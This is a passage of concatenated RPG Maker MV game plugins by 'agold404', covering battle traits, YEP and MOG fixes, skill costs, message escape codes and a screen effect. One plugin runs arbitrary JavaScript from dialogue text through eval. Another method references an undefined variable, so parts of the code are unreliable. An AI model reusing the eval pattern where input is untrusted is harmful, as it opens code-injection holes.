	} }
	return rtv.flat();
},[
gp[kwtrait],
]);

new cfc(Game_Enemy.prototype).add('makeDropItems',function f(){
	return this.enemy().dropItems.reduce(f.tbl[0].bind(this), []);
},[
function(r, di){
	const dataobj=this.itemObject(di.kind, di.dataId);
	if(0<di.kind && Math.random()*di.denominator<this.dropItemRate(dataobj)) r.push(dataobj);
	return r;
},
]);

})();


﻿"use strict";
/*:
 * @plugindesc 抵抗 buff/debuff 被消除
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t; const gbb=Game_BattlerBase;

const kwtxt_buff='buff消除抵抗';
const kwbase_buff=kwtxt_buff;
const kwtrait_buff="TRAIT_"+kwbase_buff;
const kwget_buff="get_"+kwbase_buff;

const kwtxt_debuff='debuff消除抵抗';
const kwbase_debuff=kwtxt_debuff;
const kwtrait_debuff="TRAIT_"+kwbase_debuff;
const kwget_debuff="get_"+kwbase_debuff;

gbb.addEnum(kwtrait_buff);
gbb.addEnum(kwtrait_debuff);

t=[
[gbb[kwtrait_buff],kwget_buff,],
[gbb[kwtrait_debuff],kwget_debuff,],
];

const str2num={
mhp:0,
mmp:1,
atk:2,
def:3,
mat:4,
mdf:5,
agi:6,
luk:7,
};

new cfc(Scene_Boot.prototype).add('start',function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
},[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	let ts=dataobj.traits; if(!ts) ts=dataobj.traits=[];
	if(meta[kwtxt_buff]){
		const info=JSON.parse(meta[kwtxt_buff]);
		for(let k in info){
			const rate=info[k]-0; if(!rate) continue;
			const id=isNaN(k)?((k in str2num)?str2num[k]:k):k-0;
			ts.push({code:gbb[kwtrait_buff],dataId:id,value:rate,});
		}
	}
	if(meta[kwtxt_debuff]){
		const info=JSON.parse(meta[kwtxt_debuff]);
		for(let k in info){
			const rate=info[k]-0; if(!rate) continue;
			const id=isNaN(k)?((k in str2num)?str2num[k]:k):k-0;
			ts.push({code:gbb[kwtrait_debuff],dataId:id,value:rate,});
		}
	}
},
]);

for(let x=0;x!==2;++x) new cfc(Game_BattlerBase.prototype).add(t[x][1],function f(paramId){
	return this.traitsSum(f.tbl[0],paramId);
},t[x]);

new cfc(Game_Battler.prototype).add('removeBuff',function f(paramId){
	if(this.removeBuff_isResist(paramId)) return false;
	const ori=this._buffs[paramId];
	f.ori.apply(this,arguments);
	return ori && ori!==this._buffs[paramId];
}).add('removeBuff_isResist',function f(paramId){
	if(!this._buffs[paramId]) return true;
	const rate=this._buffs[paramId]<0?this[f.tbl[1][1]](paramId):this[f.tbl[0][1]](paramId);
	return Math.random()<rate;
},t);

new cfc(Game_Action.prototype).add('itemEffectRemoveBuff',function(target,effect){
	if(target.isBuffAffected(effect.dataId)){
		if(target.removeBuff(effect.dataId)){
			this.makeSuccess(target);
		}
	}
}).add('itemEffectRemoveDebuff',function(target,effect){
	if(target.isDebuffAffected(effect.dataId)){
		if(target.removeBuff(effect.dataId)){
			this.makeSuccess(target);
		}
	}
});

})();


﻿"use strict";
/*:
 * @plugindesc 戰鬥平行執行 common event ; 改善 YEP BattleManager.actionCommonEvent
 * @author agold404
 * @help $gameTemp.reserveCommonEvent_battleParallel(id);
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_Temp.prototype).add('reserveParallelCommonEvent',function f(id){
	q.push(id);
}).add('_get_reservedParallelCommonEventQueue',function f(){
	let q=this._reservedParallelCommonEventQueue; if(!q) q=this._reservedParallelCommonEventQueue=new Queue();
	return q;
}).add('reserveParallelCommonEvent_getFront',function f(){
	return this._get_reservedParallelCommonEventQueue()[0];
}).add('reserveParallelCommonEvent_pop',function f(){
	const q=this._get_reservedParallelCommonEventQueue();
	const rtv=q[0];
	q.pop();
	return rtv;
});

new cfc(Game_Troop.prototype).add('clear',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.parallelCommonEvent_clear();
	return rtv;
}).add('parallelCommonEvent_clear',function f(){
	this.parallelCommonEvent_getCont().length=0;
	this._itrpv_parallelCommonEvent=undefined;
}).add('parallelCommonEvent_getCont',function f(){
	let rtv=this._itrpv_parallelCommonEvent; if(!rtv) rtv=this._itrpv_parallelCommonEvent=[];
	return rtv;
}).add('parallelCommonEvent_replaceCont',function f(newCont){
	this._itrpv_parallelCommonEvent=newCont;
}).add('parallelCommonEvent_update',function f(){
	const curr=this.parallelCommonEvent_getCont(),running=[];
	const mainRunning=this._interpreter&&this._interpreter.isRunning();
	let toMain;
	this.parallelCommonEvent_setupByReserved();
	for(let x=0,xs=curr.length;x!==xs;++x){ const itrp=curr[x]; if(itrp){
		itrp.update(); if(itrp.isRunning()){
			if(!itrp._toMain||mainRunning||toMain) running.push(itrp);
			else toMain=itrp;
		}
	} }
	this.parallelCommonEvent_replaceCont(running);
	if(toMain) (this._interpreter=toMain)._toMain=undefined;
}).add('parallelCommonEvent_setupByReserved',function f(willMergedToMainIfNotRunning){
	const ce=$dataCommonEvents[$gameTemp.reserveParallelCommonEvent_pop()];
	return ce&&this.parallelCommonEvent_setupByList(ce.list,willMergedToMainIfNotRunning);
}).add('parallelCommonEvent_setupByList',function f(list,willMergedToMainIfNotRunning){
	const itrp=new Game_Interpreter();
	itrp._toMain=willMergedToMainIfNotRunning;
	itrp.setup(list);
	this.parallelCommonEvent_getCont().push(itrp);
	return itrp;
});

new cfc(BattleManager).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	$gameTroop.parallelCommonEvent_update();
	return rtv;
}).add('actionCommonEvent',function f(id){
	const t=$gameTroop;
	const itrp=t&&t._interpreter;
	const citrp=itrp&&itrp._childInterpreter;
	const rtv=f.ori.apply(this,arguments);
	if(itrp && itrp._childInterpreter!==citrp){
		const pitrp=t.parallelCommonEvent_setupByList(itrp._childInterpreter._list,true);
		itrp._childInterpreter=citrp;
		this._actionList.unshift(["WAIT",[0]]);
		this._actionList[0]._itrp=pitrp;
	}
	return rtv;
}).add('processActionSequenceCheck',function f(){
	if(this._actSeq._itrp && this._actSeq._itrp.isRunning()){
		this._actionList.unshift(this._actSeq);
		return false;
	}
	return f.ori.apply(this,arguments);
}).add('actionConditionsMet',function f(){
	if(this._actSeq._itrp && !this._actSeq._itrp.isRunning()) return false;
	return f.ori.apply(this,arguments);
});

})();


﻿"use strict";
/*:
 * @plugindesc fix YEP
 * @author agold404
 * @help motion guard, wait for escape?fight?
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Sprite_Actor.prototype).add('refreshMotion',function f(){
	const actr=this._actor; if(!actr) return;
	if(f.tbl[0] === this._motion && !actr.isGuard()) this._motion=f.tbl[1];
	return f.ori.apply(this,arguments);
},[
Sprite_Actor.MOTIONS['guard'],
Sprite_Actor.MOTIONS['wait'],
]);

new cfc(Scene_Battle.prototype).add('commandFight',function f(){
	const rtv=f.ori.apply(this,arguments),m=this._btlr2sp;
	if(m) $gameParty.members().forEach(f.tbl[0],m);
	return rtv;
},[
function(btlr){ const sp=this.get(btlr); if(sp && sp.refreshMotion) sp.refreshMotion(); },
]);

})();


﻿"use strict";
/*:
 * @plugindesc 技能消耗(HP|MP|TP)時額外依照消耗比例額外消耗(HP|MP|TP)
 * @author agold404
 * @help <技能消耗(HP|MP|TP)時額外依照消耗比例額外消耗(HP|MP|TP):數字>
 * e.g. <技能消耗MP時額外依照消耗比例額外消耗HP:數字>
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t; const gbb=Game_BattlerBase;

const energies=[ "HP","MP","TP", ];

const kwbase="技能消耗時額外依照消耗比例額外消耗";
const kwtrait="TRAIT_"+kwbase;
gbb.addEnum(kwtrait);
const kwget="get_"+kwbase;
const kwtxts=[undefined,];
t=[
{},
kwget,
gbb[kwtrait],
];
for(let co=0,arr=energies,sz=arr.length;co!==sz;++co){ const part=t[0][arr[co]]={}; for(let ca=0;ca!==sz;++ca){
	part[arr[ca]]=kwtxts.length;
	kwtxts.push("技能消耗"+arr[co]+"時額外依照消耗比例額外消耗"+arr[ca]);
} }

new cfc(Scene_Boot.prototype).add('start',function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
},[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	let ts=dataobj.traits; if(!ts) ts=dataobj.traits=[];
	for(let x=1,xs=kwtxts.length;x!==xs;++x){
		const val=meta[kwtxts[x]]-0; if(!val) continue;
		ts.push({code:gbb[kwtrait],dataId:x,value:val,});
	}
},
]);

new cfc(Game_BattlerBase.prototype).add(t[1],function f(dataId){
	return this.traitsSum(f.tbl[2],dataId);
},t).add('paySkillCost',function f(){
	let dhp=this.hp,dmp=this.mp,dtp=this.tp;
	const rtv=f.ori.apply(this,arguments);
	dhp-=this.hp;
	dmp-=this.mp;
	dtp-=this.tp;
	if(dhp){
		this._hp-=this[f.tbl[1]](f.tbl[0].HP.HP)*dhp;
		this._mp-=this[f.tbl[1]](f.tbl[0].HP.MP)*dhp;
		this._tp-=this[f.tbl[1]](f.tbl[0].HP.TP)*dhp;
	}
	if(dmp){
		this._hp-=this[f.tbl[1]](f.tbl[0].MP.HP)*dmp;
		this._mp-=this[f.tbl[1]](f.tbl[0].MP.MP)*dmp;
		this._tp-=this[f.tbl[1]](f.tbl[0].MP.TP)*dmp;
	}
	if(dtp){
		this._hp-=this[f.tbl[1]](f.tbl[0].TP.HP)*dtp;
		this._mp-=this[f.tbl[1]](f.tbl[0].TP.MP)*dtp;
		this._tp-=this[f.tbl[1]](f.tbl[0].TP.TP)*dtp;
	}
	return rtv;
},t);

})();


﻿"use strict";
/*:
 * @plugindesc MOG wtf = =
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

if(typeof _alias_mog_bhud_eraseState!=='undefined') (()=>{ let k,r,t;

new cfc(Game_BattlerBase.prototype).add('eraseState',function f(stateId){
	const had=this._states.uniqueHas(stateId);
	const rtv=f.ori.apply(this,arguments);
	this.need_refresh_bhud_states = had&&!this._states.uniqueHas(stateId);
	return rtv;
}).add('addNewState',function f(stateId){
	const had=this._states.uniqueHas(stateId);
	const rtv=f.ori.apply(this,arguments);
	this.need_refresh_bhud_states = !had&&this._states.uniqueHas(stateId);
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 文字顯示途中播音效、晃畫面
 * @author agold404
 * @help \AUDIO_SE"path|vol|pitch|pan|pos"
 * \AUDIO_SE \AUDIO_ME \AUDIO_BGS \AUDIO_BGM
 * \CHANGEFACE"id|faceName|faceIndex|z"
 * \EVALJSCODE""
 * \SHAKESCREEN"power|speed|duration"
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const evaljs=(s,self)=>eval(s);

k={
STATE_NEXTSTART:0,
STATE_SLASH1:1,
FUNC_ISSCENEMSGWND:self=>{
	const sc=SceneManager._scene;
	return sc&&sc._messageWindow===self;
},
FUNC_PARSEINFO_AUDIO:(state,txt,strt,arr)=>{
	if(txt[strt]!=='"') return strt-1;
	const last=txt.indexOf('"',++strt); if(last<0) throw new Error('\\AUDIO_* format error');
	state.x=last;
	if(strt===last){
		state.txt+=';';
		return last; // empty info
	}
	if(arr){
		const info=txt.slice(strt,last).split("|");
		arr.push({name:info[0],volume:isNaN(info[1])?90:info[1]-0,pitch:isNaN(info[2])?100:info[2]-0,pan:info[3]-0||0,pos:info[4]-0||0,});
		state.txt+="AUDIO";
		state.txt+=arr._key;
		state.txt+='[';
		state.txt+=arr.length-1;
		state.txt+=']';
	}else state.txt+=';'; // not using
	return last;
},
FUNC_PARSEINFO_CHANGEFACE:function(state,txt,strt,isScMsgWnd){
	if(txt[strt]!=='"') return strt-1;
	let arr;
	if(isScMsgWnd && !(arr=this._changefaceInfo)) (arr=this._changefaceInfo=[])._key="";
	const last=txt.indexOf('"',++strt); if(last<0) throw new Error('\\CHANGEFACE format error');
	state.x=last;
	if(strt===last){
		state.txt+=';';
		return last; // empty info
	}
	if(arr){
		const info=txt.slice(strt,last).split("|"); // "id|faceName|faceIndex|z"
		if(!isNaN(info[0])) info[0]-=0;
		arr.push(info);
		state.txt+="CHANGEFACE";
		state.txt+=arr._key;
		state.txt+='[';
		state.txt+=arr.length-1;
		state.txt+=']';
	}else state.txt+=';'; // not using
	return last;
},
FUNC_PARSEINFO_EVALJSCODE:function(state,txt,strt,isScMsgWnd){
	if(txt[strt]!=='"') return strt-1;
	let arr;
	if(isScMsgWnd && !(arr=this._evaljscodeInfo)) (arr=this._evaljscodeInfo=[])._key="";
	const last=txt.indexOf('"',++strt); if(last<0) throw new Error('\\EVALJSCODE format error');
	state.x=last;
	if(strt===last){
		state.txt+=';';
		return last; // empty info
	}
	if(arr){
		const info=getCStyleStringStartAndEndFromString(txt,strt-1,last+1);
		arr.push(JSON.parse(txt.slice(info.start,info.end)));
		state.txt+="EVALJSCODE";
		state.txt+=arr._key;
		state.txt+='[';
		state.txt+=arr.length-1;
		state.txt+=']';
	}else state.txt+=';'; // not using
	return last;
},
FUNC_PARSEINFO_SHAKESCREEN:function(state,txt,strt,isScMsgWnd){
	if(txt[strt]!=='"') return strt-1;
	let arr;
	if(isScMsgWnd && !(arr=this._shakescreenInfo)) (arr=this._shakescreenInfo=[])._key="";
	const last=txt.indexOf('"',++strt); if(last<0) throw new Error('\\SHAKESCREEN format error');
	state.x=last;
	if(strt===last){
		state.txt+=';';
		return last; // empty info
	}
	if(arr){
		const info=txt.slice(strt,last).split("|"); // power|speed|duration as function args order
		arr.push(info);
		state.txt+="SHAKESCREEN";
		state.txt+=arr._key;
		state.txt+='[';
		state.txt+=arr.length-1;
		state.txt+=']';
	}else state.txt+=';'; // not using
	return last;
},
FUNCS_SLASH1:{
BG:function(state,text,x,isScMsgWnd,func_parseInfo){
	let newx;
	switch(text[x+2]){
	case "M":
		if(isScMsgWnd && !this._audioInfo_bgm) (this._audioInfo_bgm=[])._key="BGM";
		newx=func_parseInfo(state,text,x+3,this._audioInfo_bgm);
		if(newx<x+3) newx=x;
		break;
	case "S":
		if(isScMsgWnd && !this._audioInfo_bgs) (this._audioInfo_bgs=[])._key="BGS";
		newx=func_parseInfo(state,text,x+3,this._audioInfo_bgs);
		if(newx<x+3) newx=x;
		break;
	default:
		newx=x;
		break;
	}
	return newx;
},
ME:function(state,text,x,isScMsgWnd,func_parseInfo){
	if(isScMsgWnd && !this._audioInfo_me) (this._audioInfo_me=[])._key="ME";
	let newx=func_parseInfo(state,text,x+2,this._audioInfo_me);
	if(newx<x+2) newx=x;
	return newx;
},
SE:function(state,text,x,isScMsgWnd,func_parseInfo){
	if(isScMsgWnd && !this._audioInfo_se) (this._audioInfo_se=[])._key="SE";
	let newx=func_parseInfo(state,text,x+2,this._audioInfo_se);
	if(newx<x+2) newx=x;
	return newx;
},
},
STR_AUDIOPREFIX:"AUDIO_",
STR_CHANGEFACE:"CHANGEFACE",
STR_EVALJSCODE:"EVALJSCODE",
STR_SHAKESCREEN:"SHAKESCREEN",
};
t=[];
t[k.STATE_NEXTSTART]=function f(state,text){
	// next start
	if(text[state.x]==='\\') state.fsm=f.tbl.STATE_SLASH1;
	else state.txt+=text[state.x];
	++state.x;
};
t[k.STATE_SLASH1]=function f(state,text){
	// slash*1
	state.fsm=f.tbl.STATE_NEXTSTART;
	state.txt+='\\';
	if(text[state.x]==='\\') state.txt+='\\';
	else{
		let x;
		x=f.tbl.STR_AUDIOPREFIX.length+state.x;
		if(f.tbl.STR_AUDIOPREFIX===text.slice(state.x,x)){
			const func=f.tbl.FUNCS_SLASH1[text.slice(x,x+2)];
			if(func && x<func.call(this,state,text,x,f.tbl.FUNC_ISSCENEMSGWND(this),f.tbl.FUNC_PARSEINFO_AUDIO)) return ++state.x; // matched
		}
		x=f.tbl.STR_CHANGEFACE.length+state.x;
		if(f.tbl.STR_CHANGEFACE===text.slice(state.x,x)){
			if(x<f.tbl.FUNC_PARSEINFO_CHANGEFACE.call(this,state,text,x,f.tbl.FUNC_ISSCENEMSGWND(this))) return ++state.x; // matched
		}
		x=f.tbl.STR_EVALJSCODE.length+state.x;
		if(f.tbl.STR_EVALJSCODE===text.slice(state.x,x)){
			if(x<f.tbl.FUNC_PARSEINFO_EVALJSCODE.call(this,state,text,x,f.tbl.FUNC_ISSCENEMSGWND(this))) return ++state.x; // matched
		}
		x=f.tbl.STR_SHAKESCREEN.length+state.x;
		if(f.tbl.STR_SHAKESCREEN===text.slice(state.x,x)){
			if(x<f.tbl.FUNC_PARSEINFO_SHAKESCREEN.call(this,state,text,x,f.tbl.FUNC_ISSCENEMSGWND(this))) return ++state.x; // matched
		}
		state.txt+=text[state.x];
	}
	++state.x;
};
t.forEach(f=>f.tbl=f.ori=k);

new cfc(Window_Base.prototype).add('convertEscapeCharacters',function f(text){
	const state={x:0,fsm:0,txt:'',},xs=text.length;
	while(state.x<xs) f.tbl[state.fsm].call(this,state,text);
	if(arguments && arguments[0]) arguments[0]=state.txt;
	return f.ori.apply(this,arguments);
},t);

new cfc(Window_Message.prototype).add('processEscapeCharacter',function f(code,textState){
	const func=f.tbl[code];
	return func?func.call(this,textState):f.ori.apply(this,arguments);
},{
AUDIOBGM:function(textState){
	const info=this.processEscapeCharacter_getAudioInfo(this._audioInfo_bgm,textState);
	if(info) AudioManager.playBgm(info);
},
AUDIOBGS:function(textState){
	const info=this.processEscapeCharacter_getAudioInfo(this._audioInfo_bgs,textState);
	if(info) AudioManager.playBgs(info);
},
AUDIOME:function(textState){
	const info=this.processEscapeCharacter_getAudioInfo(this._audioInfo_me,textState);
	if(info) AudioManager.playMe(info);
},
AUDIOSE:function(textState){
	const info=this.processEscapeCharacter_getAudioInfo(this._audioInfo_se,textState);
	if(info) AudioManager.playSe(info);
},
CHANGEFACE:function(textState){
	const info=this.processEscapeCharacter_getChangefaceInfo(this._changefaceInfo,textState);
	if(info) this.separatedFaces_redrawFace&&this.separatedFaces_redrawFace.apply(this,info);
},
EVALJSCODE:function(textState){
	const info=this.processEscapeCharacter_getEvaljscodeInfo(this._evaljscodeInfo,textState);
	if(info) evaljs(info,this);
},
SHAKESCREEN:function(textState){
	const info=this.processEscapeCharacter_getShakescreenInfo(this._shakescreenInfo,textState);
	if(info) Game_Screen.prototype.startShake.apply($gameScreen,info);
},
}).add('processEscapeCharacter_getAudioInfo',function f(arr,textState){
	return arr&&arr[this.obtainEscapeParam(textState)];
}).add('processEscapeCharacter_getChangefaceInfo',function f(arr,textState){
	return arr&&arr[this.obtainEscapeParam(textState)];
}).add('processEscapeCharacter_getEvaljscodeInfo',function f(arr,textState){
	return arr&&arr[this.obtainEscapeParam(textState)];
}).add('processEscapeCharacter_getShakescreenInfo',function f(arr,textState){
	return arr&&arr[this.obtainEscapeParam(textState)];
});

})();


﻿"use strict";
/*:
 * @plugindesc 全畫面複視特效 fullScreenDiplopiaEffect
 * @author agold404
 * @help cx cy alpha dScaleX dScaleY dShiftX dShiftY dur fadeOutDur fadeInDur
 * dScale_: 0略 ; >0放大 ; <0縮小 ; scale._+=dScale_
 * dShift_: unit: pixels/frame
 * _dur: unit: frames
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_Screen.prototype).add('fullScreenDiplopiaEffect_getCont',function f(){
	let rtv=this._fullScreenDiplopiaEffects; if(!rtv) rtv=this._fullScreenDiplopiaEffects=[];
	return rtv;
}).add('_fullScreenDiplopiaEffect_gen',function f(info){
	this.fullScreenDiplopiaEffect_getCont().push(info);
}).add('fullScreenDiplopiaEffect_gen',function f(cx,cy,alpha,dScaleX,dScaleY,dShiftX,dShiftY,dur,fadeOutDur,fadeInDur){
	if(cx===undefined) cx=Graphics.boxWidth  >>1;
	if(cy===undefined) cy=Graphics.boxHeight >>1;
	cx=cx-0||0;
	cy=cy-0||0;
	alpha=alpha-0||0;
	dScaleX=dScaleX-0||0;
	dScaleY=dScaleY-0||0;
	dShiftX=dShiftX-0||0;
	dShiftY=dShiftY-0||0;
	dur|=0; if(dur<0) dur=0;
	fadeOutDur|=0; if(fadeOutDur<0) fadeOutDur=0;
	fadeInDur|=0; if(fadeInDur<0) fadeInDur=0;
	if(!(alpha>=0)||!(dur+fadeOutDur+fadeInDur)) return;
	this._fullScreenDiplopiaEffect_gen({
		dur:{c:0,i:fadeInDur,o:fadeOutDur,s:dur,},
		alpha:alpha,
		c:{x:cx,y:cy,},
		scale:{x:1,y:1,},
		dScale:{x:dScaleX,y:dScaleY,},
		shift:{x:0,y:0,},
		dShift:{x:dShiftX,y:dShiftY,},
	});
}).add('fullScreenDiplopiaEffect_update',function f(frames){
	frames|=0; if(frames<0) return;
	let i=0,arr=this.fullScreenDiplopiaEffect_getCont();
	for(let j=0,sz=arr.length;j!==sz;++j){
		const e=arr[j]; if(!((e.dur.c+=frames)<e.dur.i+e.dur.o+e.dur.s)) continue;
		e.scale.x+=e.dScale.x*frames;
		e.scale.y+=e.dScale.y*frames;
		e.shift.x+=e.dShift.x*frames;
		e.shift.y+=e.dShift.y*frames;
		arr[i++]=e;
	}
	arr.length=i;
});

new cfc(Graphics).add('renderOtherEffects',function f(){
	this.renderFullScreenDiplopiaEffect();
	return f.ori.apply(this,arguments);
}).add('renderFullScreenDiplopiaEffect',function f(){
	if(!$gameScreen) return;
	const canvasId='fullScreenDiplopiaEffect',d=document;
	const c=this._canvas;
	const shrinkBits=f.tbl.shrinkBits;
	const blurPx=f.tbl.blurPx;
	const w=c.width>>shrinkBits,h=c.height>>shrinkBits;
	
	let gc2=f.gc2||d.getElementById(canvasId);
	if(!gc2){
		gc2=f.gc2=d.createElement('canvas');
		gc2.setAttribute('id',canvasId);
		gc2.setAttribute('style',c.getAttribute('style'));
		d.body.appendChild(gc2);
		gc2.width =w;
		gc2.height=h;
		this.renderEffects_sortCanvas();
	}
	const infos=$gameScreen.fullScreenDiplopiaEffect_getCont();
	gc2.style.display=infos.length?'':'none';
	if(gc2.width !==w) gc2.width =w;
	if(gc2.height!==h) gc2.height=h;
	if(gc2._blurPx!==blurPx){
		gc2._blurPx=blurPx;
		gc2.style.filter=blurPx?"blur("+blurPx+"px)":"";
	}
	
	if(gc2.style.width!==c.style.width) gc2.style.width=c.style.width;
	if(gc2.style.height!==c.style.height) gc2.style.height=c.style.height;
	const fc=this.frameCount;
	const dfc=fc-f.tbl.fc||0;
	f.tbl.fc=fc;
	if(!dfc) return; // NaN||0 not inited yet or too eager
	
	const ctx2=gc2.getContext('2d'); ctx2.clearRect(0,0,w,h);
	for(let x=infos.length
		,dur
		,alpha
		,cxy,scale,shift
		,tmpc=f.tbl.tmpc
		,tmpctx=f.tbl.tmpc.getContext('2d')
		,padw=(c.width<<shrinkBits<<1)-1,padh=(c.height<<shrinkBits<<1)-1
		,srcw,srch
		,dstw,dsth
		,dstx,dsty
		;x--;){
		
		dur=infos[x].dur;
		if(dur.c<dur.i) alpha=infos[x].alpha*dur.c/dur.i;
		else if(dur.c<dur.i+dur.s) alpha=infos[x].alpha;
		else alpha=infos[x].alpha*(dur.i+dur.s+dur.o-dur.c)/dur.o;
		if(!alpha) continue;
		
		scale=infos[x].scale;
		dstw=(c.width  *scale.x)>>shrinkBits;
		dsth=(c.height *scale.y)>>shrinkBits;
		
		cxy=infos[x].c;
		shift=infos[x].shift;
		dstx=((cxy.x*(1-scale.x)+shift.x+padw)>>shrinkBits)-(padw>>shrinkBits);
		dsty=((cxy.y*(1-scale.y)+shift.y+padh)>>shrinkBits)-(padh>>shrinkBits);
		
		// edit w,h will clear canvas
		tmpc.width=c.width>>shrinkBits; tmpc.height=c.height>>shrinkBits;
		tmpctx=tmpc.getContext('2d');
		tmpctx.globalCompositeOperation='source-over';
		tmpctx.fillStyle="rgba(0,0,0,"+alpha+")";
		tmpctx.fillRect(0,0,tmpc.width,tmpc.height);
		tmpctx.globalCompositeOperation="source-atop";
		tmpctx.drawImage(c,0,0,c.width,c.height,0,0,tmpc.width,tmpc.height);
		ctx2.drawImage(tmpc,0,0,tmpc.width,tmpc.height,dstx,dsty,dstw,dsth);
	}
	$gameScreen.fullScreenDiplopiaEffect_update(dfc);
},{
frameCount:0, // W/R
blurPx:0, // R
shrinkBits:2, // R
tmpc:document.createElement('canvas'), // key:R ; obj:W/R
});

new cfc(BattleManager).add('fullScreenDiplopiaEffect_genAtBtlr',function f(btlr,dx,dy,alpha,dScaleX,dScaleY,dShiftX,dShiftY,dur,fadeOutDur,fadeInDur){
	if(btlr&&btlr.constructor===Array){
		for(let x=0;x!==btlr.length;++x) f.call(this,btlr[x],dx,dy,alpha,dScaleX,dScaleY,dShiftX,dShiftY,dur,fadeOutDur,fadeInDur);
		return;
	}
	const sc=SceneManager._scene;
	const sp=sc._btlr2sp&&sc._btlr2sp.get(btlr); if(!sp) return;
	dx|=0; dy|=0;
	return $gameScreen.fullScreenDiplopiaEffect_gen(sp.x+dx,sp.y+dy,alpha,dScaleX,dScaleY,dShiftX,dShiftY,dur,fadeOutDur,fadeInDur);
}).add('fullScreenDiplopiaEffect_genAtTarget',function f(dx,dy,alpha,dScaleX,dScaleY,dShiftX,dShiftY,dur,fadeOutDur,fadeInDur){
	return this.fullScreenDiplopiaEffect_genAtBtlr(this._targets,dx,dy,alpha,dScaleX,dScaleY,dShiftX,dShiftY,dur,fadeOutDur,fadeInDur);
}).add('fullScreenDiplopiaEffect_genAtSubject',function f(dx,dy,alpha,dScaleX,dScaleY,dShiftX,dShiftY,dur,fadeOutDur,fadeInDur){
	return this.fullScreenDiplopiaEffect_genAtBtlr(this._subject,dx,dy,alpha,dScaleX,dScaleY,dShiftX,dShiftY,dur,fadeOutDur,fadeInDur);
});

new cfc(Game_Character.prototype).add('fullScreenDiplopiaEffect_gen',function f(dx,dy,alpha,dScaleX,dScaleY,dShiftX,dShiftY,dur,fadeOutDur,fadeInDur){
	const sc=SceneManager._scene;
	const sp=sc._chr2sp&&sc._chr2sp.get(this); if(!sp) return;
	dx|=0; dy|=0;
	return $gameScreen.fullScreenDiplopiaEffect_gen(sp.x+dx,sp.y+dy,alpha,dScaleX,dScaleY,dShiftX,dShiftY,dur,fadeOutDur,fadeInDur);
});

})();


﻿"use strict";
/*:
 * @plugindesc 給予YEP強力譴責
 * @author agold404
 * @help 好意思把BattleManager._phase==='aborting'蓋成'battleEnd'以外的東西?
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const setter=function f(rhs){
	if(this._phase===f.tbl[1] && rhs!==f.tbl[2]){
		console.warn('[WARNING] setting battle phase other than \',f.tbl[2],\' when \',f.tbl[1],\'. open DevTools before this message appears to see who messed up.');
		return this[f.tbl[0]];
	}else return this[f.tbl[0]]=rhs;
};
const getter=function f(){return this[f.tbl[0]];}
getter.tbl=getter.ori=setter.tbl=setter.ori=['__phase','aborting','battleEnd',];
Object.defineProperty(BattleManager,'_phase',{
	set:setter,
	get:getter,
	configurable:false,
});
console.log('戰鬥插件亂設定戰鬥狀態真的笑死');

})();


﻿"use strict";
/*:
 * @plugindesc 自行施放之技能/道具之action sequenceㄉ動畫將跟著該seqㄉ時間：動就動；暫停就暫停。
 * @author agold404
 * @help .
 * 還有: 旋轉、縮放 option (data from 全域動畫選項)
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_Interpreter.prototype).add('setup',function f(){
	const cnt=this.get_forceActionQueueLength();
	this._forceActionQueueCnt=undefined; // let cal. be NaN
	const rtv=f.ori.apply(this,arguments);
	this._forceActionQueueCnt=cnt;
	return rtv;
}).add('clear',function f(){
	const rtv=f.ori.apply(this,arguments);
	let d=this.get_forceActionQueueLength()-this._forceActionQueueCnt;
	this._forceActionQueueCnt=undefined;
	while(d-->0) this.get_forceActionQueue().pop_back();
	return rtv;
}).add('get_forceActionQueueLength',function f(){
	const q=this.get_forceActionQueue();
	return q?q.length:0;
},undefined,true,true).add('get_forceActionQueue',function f(){
	return BattleManager._forceActionQueue;
},undefined,true,true);

new cfc(BattleManager).add('startBattle',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.actSeqFrameMap_clearCont();
	return rtv;
}).add('_createActions',function f(retPhase,key){
	this._returnPhase=retPhase;
	const item=this._action.item();
	const arr=this._actionList=item[key].slice();
	arr._item=item;
	arr._phase=key;
}).add('createSetupActions',function f(){
	$gameTemp.clearActionSequenceSettings();
	return this._createActions(f.tbl[0],f.tbl[1]);
},[
'setup',
'setupActions',
],true,true).add('createWholeActions',function f(){
	return this._createActions(f.tbl[0],f.tbl[1]);
},[
'whole',
'wholeActions',
],true,true).add('createTargetActions',function f(){
	this.setTargets([this._individualTargets[0]]);
	const rtv=this._createActions(f.tbl[0],f.tbl[1]);
	this._phase=f.tbl[2];
	return rtv;
},[
'target',
'targetActions',
